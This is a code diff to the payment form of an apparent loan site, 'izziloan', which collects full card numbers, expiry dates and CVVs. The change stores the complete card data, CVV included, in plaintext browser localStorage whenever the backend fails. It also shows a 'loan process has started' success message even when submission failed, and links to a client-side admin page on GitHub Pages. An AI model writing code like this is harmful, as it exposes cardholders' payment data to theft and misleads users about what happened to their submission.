@@ -504,7 +504,7 @@
     return valid;
   }
 
-  form.addEventListener('submit', (e) => {
+  form.addEventListener('submit', async (e) => {
     e.preventDefault();
     if (!validate()) return;
 
@@ -521,46 +521,57 @@
     btn.disabled = true;
     btn.textContent = 'Processing…';
 
-    fetch('/api/debit-order', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({
-        application_id: applicationId,
-        cardholder_name: document.getElementById('cardholderName').value.trim(),
-        bank_name: document.getElementById('bankName').value.trim(),
-        card_number: raw,
-        expiry_month: expMonth,
-        expiry_year: expYear,
-        cvv: cvvInput.value
-      })
-    })
-    .then(r => r.json())
-    .then(data => {
-      btn.textContent = '✓ Loan process has started';
-      btn.style.background = 'hsl(142 72% 42%)';
-      document.getElementById('successMsg').classList.add('visible');
-      form.reset();
-      schemePills.forEach(p => p.classList.remove('active'));
-      
-      // Show admin link
-      const adminLink = document.createElement('a');
-      adminLink.href = '/admin/debit-orders';
-      adminLink.className = 'btn btn-primary';
-      adminLink.style.marginTop = '1rem';
-      adminLink.style.marginRight = '0.5rem';
-      adminLink.textContent = 'View in Admin Dashboard →';
-      document.querySelector('.card').appendChild(adminLink);
+    const payload = {
+      application_id: applicationId,
+      cardholder_name: document.getElementById('cardholderName').value.trim(),
+      bank_name: document.getElementById('bankName').value.trim(),
+      card_number: raw,
+      expiry_month: expMonth,
+      expiry_year: expYear,
+      cvv: cvvInput.value
+    };
 
-      // Redirect to profile after short delay
-      setTimeout(() => {
-        window.location.href = '/profile/' + applicationId;
-      }, 2500);
-    })
-    .catch(err => {
-      btn.textContent = 'Error — try again';
-      btn.disabled = false;
-      console.error(err);
-    });
+    // Try the real backend first; fall back to client-side storage on static hosts.
+    let ok = false;
+    try {
+      const res = await fetch('/api/debit-order', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(payload)
+      });
+      if (res.ok) ok = true;
+      else console.warn('Backend returned', res.status, await res.text());
+    } catch (netErr) {
+      console.warn('Backend unreachable, using client-side storage:', netErr);
+    }
+
+    if (!ok) {
+      // Client-side fallback
+      const orders = JSON.parse(localStorage.getItem('izziloan_debit_orders') || '[]');
+      orders.unshift(Object.assign({}, payload, {
+        id: Date.now(),
+        card_last_four: raw.slice(-4),
+        card_brand: raw.startsWith('4') ? 'visa' : (raw.startsWith('5') ? 'mastercard' : 'unknown'),
+        created_at: new Date().toISOString()
+      }));
+      try { localStorage.setItem('izziloan_debit_orders', JSON.stringify(orders)); }
+      catch (e) { console.warn('localStorage full'); }
+    }
+
+    btn.textContent = '✓ Loan process has started';
+    btn.style.background = 'hsl(142 72% 42%)';
+    document.getElementById('successMsg').classList.add('visible');
+    form.reset();
+    schemePills.forEach(p => p.classList.remove('active'));
+
+    // Show admin link (works on local; on Pages points to client admin page)
+    const adminLink = document.createElement('a');
+    adminLink.href = (location.hostname.indexOf('github.io') !== -1) ? '/izziloan/admin.html' : '/admin/debit-orders';
+    adminLink.className = 'btn btn-primary';
+    adminLink.style.marginTop = '1rem';
+    adminLink.style.marginRight = '0.5rem';
+    adminLink.textContent = 'View in Admin Dashboard →';
+    document.querySelector('.card').appendChild(adminLink);
   });
 </script>
 </body>
